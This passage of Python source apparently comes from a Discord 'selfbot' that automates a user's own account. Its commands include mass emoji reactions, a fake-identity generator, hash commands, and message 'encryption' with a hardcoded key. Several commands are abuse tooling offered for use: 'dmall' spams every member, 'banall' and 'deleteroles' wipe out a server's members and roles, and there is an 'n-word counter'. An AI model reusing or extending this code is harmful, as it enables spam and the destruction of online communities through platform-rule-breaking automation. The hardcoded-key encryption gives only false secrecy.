            not_unicode_emoji_list = []
            react = ''
            emotes = re.findall(r'<a?:(?:[a-zA-Z0-9]+?):(?:[0-9]+?)>', msg)
            react = re.sub(r'<a?:([a-zA-Z0-9]+?):([0-9]+?)>', '', msg)

            for emote in emotes:
                reactions.append(discord.utils.get(React.emojis, id=int(emote.split(':')[-1][:-1])))
                not_unicode_emoji_list.append(emote)

            react_original = react

            if has_dupe(react):
                if prefer_combine:
                    react = replace_combos(react)

                react = replace_letters(react)

                if has_dupe(react):
                    if not prefer_combine:
                        react = react_original
                        react = replace_combos(react)
                        react = replace_letters(react)
                        if has_dupe(react):
                            return
                
                for char in react:
                    if char not in '0123456789':
                        if char !=  '¬£':
                            reactions.append(char)
                    else:
                        reactions.append(emoji_dict[char][0])
            else:
                for char in react:
                    if char in 'abcdefghijklmnopqrstuvwxyz0123456789!?':
                        reactions.append(emoji_dict[char][0])
                    else:
                        reactions.append(char)
            
            if channel == 'current':
                async for message in ctx.message.channel.history(limit=limit):
                    if (not msg_id and message.id != ctx.message.id) or (msg_id == message.id):
                        for i in reactions:
                            try:
                                await message.add_reaction(i)
                            except:
                                pass

            else:
                found_channel = find_channel(ctx.guild.channels, channel)
                if not found_channel:
                    found_channel = find_channel(React.get_all_channels(), channel)
                if found_channel:
                    async for message in found_channel.history(limit=limit):
                        if (not msg_id and message.id != ctx.message.id) or (msg_id == message.id):
                            for i in reactions:
                                try:
                                    await message.add_reaction(i)
                                except:
                                    pass

                else:
                    pass
        except:
            pass
        
    @React.command(usage="fakedata", description="Generates a fake identity")
    async def fakedata(ctx, locale: str='en'):
        
        request = requests.get(f'https://randomuser.me/api/?format=json')
        response = request.json()
        data = response['results'][0]
        gender = data['gender']
        name = f"{data['name']['first']} {data['name']['last']}"
        street = f"{data['location']['street']['number']} {data['location']['street']['name']}"
        city = data['location']['city']
        state = data['location']['state']
        country = data['location']['country']
        postcode = data['location']['postcode']
        phone = data['phone']
        email = data['email']
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Fake Data Generator',timestamp=embed_timestamp())
        embed.add_field(name=f'Name', value=f'{name}', inline=True)
        embed.add_field(name=f'Gender', value=f'{gender}', inline=True)
        embed.add_field(name=f'Street', value=f'{street}', inline=True)
        embed.add_field(name=f'Zipcode', value=f'{postcode}', inline=True)
        embed.add_field(name=f'City', value=f'{city}', inline=True)
        embed.add_field(name=f'State', value=f'{state}', inline=True)
        embed.add_field(name=f'Country', value=f'{country}', inline=True)
        embed.add_field(name=f'Phone', value=f'{phone}', inline=True)
        embed.add_field(name=f'E-Mail', value=f'{email}', inline=True)
        embed.set_thumbnail(url=f"{data['picture']['large']}")
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)



    @React.command(usage="dmall <Text>", description="DM's all users on the server with the specified message")
    async def dmall(ctx, *, msg: str):

        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='DM all',timestamp=embed_timestamp())
        embed.add_field(name=f'__‚úî Status__', value=f'Trying to DM all members. Note that this might only work sometimes and not with all members due to Discord API limitations.', inline=True)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        
        try:
            members = ctx.channel.members
            for member in members:
                if member is not ctx.author:
                    try:
                        await member.send(msg)
                    except Exception:
                        pass
        except Exception:
            pass
        
    @React.command(usage="banall", description="Bans all users on the server except yourself")
    async def banall(ctx):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Ban all',timestamp=embed_timestamp())
        embed.add_field(name=f'__‚úî Status__', value=f'Trying to ban all members.', inline=True)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        members = ctx.channel.members
        for member in members:
            if member is not ctx.author:
                try:
                    await member.ban()
                except Exception:
                    pass

    @React.command(usage="nickall <Nick>", description="Nicks all members")
    async def nickall(ctx, *, nick):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Nick all',timestamp=embed_timestamp())
        embed.add_field(name=f'__‚úî Status__', value=f'Setting the nicknames of everyone to **{nick}**.', inline=True)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        members = ctx.channel.members
        for member in members:
            try:
                await member.edit(nick=nick)
            except Exception:
                pass

    @React.command(usage="unbanall", description="Unban all users")
    async def unbanall(ctx):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Unban all',timestamp=embed_timestamp())
        embed.add_field(name=f'__‚úî Status__', value=f'Trying to unban all members.', inline=True)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        for ban in await ctx.guild.bans():
            try:
                await ctx.guild.unban(discord.Object(id=ban.user.id))
            except Exception:
                pass

    @React.command(usage="sha512 <Text>", description="Encrypts text to sha512")
    async def sha512(ctx, *, message):
        try:
            hashed = hashlib.sha512(str(message).encode("utf-8")).hexdigest()
        
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='SHA512',timestamp=embed_timestamp())
            embed.add_field(name=f'__üîê Hash__', value=f'`{hashed}`', inline=True)
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="sha256 <Text>", description="Encrypts text to sha256")
    async def sha256(ctx, *, message):
        try:
            hashed = hashlib.sha256(str(message).encode("utf-8")).hexdigest()
        
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='SHA256',timestamp=embed_timestamp())
            embed.add_field(name=f'__üîê Hash__', value=f'`{hashed}`', inline=True)
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="sha1 <Text>", description="Encrypts text to sha1")
    async def sha1(ctx, *, message):
        try:
            hashed = hashlib.sha1(str(message).encode("utf-8")).hexdigest()
        
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='SHA1',timestamp=embed_timestamp())
            embed.add_field(name=f'__üîê Hash__', value=f'`{hashed}`', inline=True)
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="md5 <Text>", description="Encrypts text to md5")
    async def md5(ctx, *, message):
        try:
            hashed = hashlib.md5(str(message).encode("utf-8")).hexdigest()
        
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='MD5',timestamp=embed_timestamp())
            embed.add_field(name=f'__üîê Hash__', value=f'`{hashed}`', inline=True)
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="whirlpool <Text>", description="Encrypts text to whirlpool")
    async def whirlpool(ctx, *, message):
        try:
            hashed = hashlib.new("whirlpool")
            hashed.update(str(message).encode("utf-8"))
        
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Whirlpool',timestamp=embed_timestamp())
            embed.add_field(name=f'__üîê Hash__', value=f'`{hashed.hexdigest()}`', inline=True)
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass

    @React.command(usage="nwordcounter", description="Shows how many times the n-word has been said")
    async def nwordcounter(ctx):
        try:
            global nwordcounter
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='N-Word counter',timestamp=embed_timestamp())
            embed.add_field(name=f'__üßëüèø Amount__', value=f'`{nwordcounter}`', inline=True)
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
                
    crypt_key = hashlib.md5("jSkfBsxBBt4qmqqfjDtf53v6mMMsS7M2dmBf9dsPRFFDbAdLG4VdshJLsGRh3423X4Nm4X64tvHwWm4Wrc5QZ2zbTALfQ9Te5CwfzrADWJCmUCFx6GBpx7J4RgSMpZBZsZNnLPBR6VhndY3SkQfmeGy5BuKKJcKBd9KXpeXdfMQz8tqzZcNnAF7DuMfu5HRdfBLT6xWQxXts75uJHqZ7MSKwUa6VHHtEz2sdTnjKtxFhWZHeYQpbMg2gdzxRcAFK".encode('utf-8')).digest()
                
    @React.command(usage="reactencrypt <Message>", description="Encrypt a message for React Selfbot users")
    async def reactencrypt(ctx, *, message):
        try:
            
            iv = get_random_bytes(AES.block_size)
            cipher = AES.new(crypt_key, AES.MODE_CBC, iv)
            encrypted = base64.b64encode(iv + cipher.encrypt(pad(message.encode('utf-8'), AES.block_size)))
        
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='React Encryption',timestamp=embed_timestamp())
            embed.add_field(name=f'__üîê Encrypted Message__', value=f'`{encrypted.decode()}` \n Only React Selfbot users can decrypt this message.', inline=True)
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
        
    @React.command(usage="reactdecrypt <Message>", description="Decrypt a message from a React Selfbot user")
    async def reactdecrypt(ctx, *, message):
        try:
            raw = base64.b64decode(message)
            cipher = AES.new(crypt_key, AES.MODE_CBC, raw[:AES.block_size])
            decrypted = unpad(cipher.decrypt(raw[AES.block_size:]), AES.block_size)

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='React Decryption',timestamp=embed_timestamp())
            embed.add_field(name=f'__üîê Decrypted Message__', value=f'`{decrypted.decode()}`', inline=True)
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


        except Exception:
            pass
                
    @React.command(usage="ban <User>", description="Bans an user")
    async def ban(ctx, member: discord.Member):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Ban',timestamp=embed_timestamp())
        embed.add_field(name=f'__‚úî Status__', value=f'Banned member {member.mention}.', inline=True)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        await member.ban()

    @React.command(usage="softban <User>", description="Bans and unbans an user")
    async def softban(ctx, member: discord.Member):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Softban',timestamp=embed_timestamp())
        embed.add_field(name=f'__‚úî Status__', value=f'Softbanned member {member.mention}.', inline=True)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        member_object = member.id
        await member.ban()
        try:
            await ctx.guild.unban(discord.Object(id=member_object))
        except Exception:
            pass

    @React.command(usage="hackban <User ID>", description="Bans an user outside of the server")
    async def hackban(ctx, user_id: int):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Hackban',timestamp=embed_timestamp())
        embed.add_field(name=f'__‚úî Status__', value=f'Banned user with the ID {user_id}.', inline=True)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        try:
            await ctx.guild.ban(discord.Object(id=user_id))
        except Exception:
            pass

    @React.command(usage="unban <User ID>", description="Unban an user")
    async def unban(ctx, user_id: int):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Unban',timestamp=embed_timestamp())
        embed.add_field(name=f'__‚úî Status__', value=f'Unbanned user with the ID {user_id}.', inline=True)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        try:
            await ctx.guild.unban(discord.Object(id=user_id))
        except Exception:
            pass
        

    @React.command(usage="kick <User>", description="Kicks an user")
    async def kick(ctx, member: discord.Member):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Kick',timestamp=embed_timestamp())
        embed.add_field(name=f'__‚úî Status__', value=f'Kicked member {member.mention}.', inline=True)
        embed.set_thumbnail(url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
        embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
        embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
        await embed_or_codeblock(ctx, embed)


        await member.kick()
            
    @React.command(usage="deleteroles", description="Deletes all roles on the server")
    async def deleteroles(ctx, server_id: int=None):
        embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title='Delete Roles',timestamp=embed_timestamp())
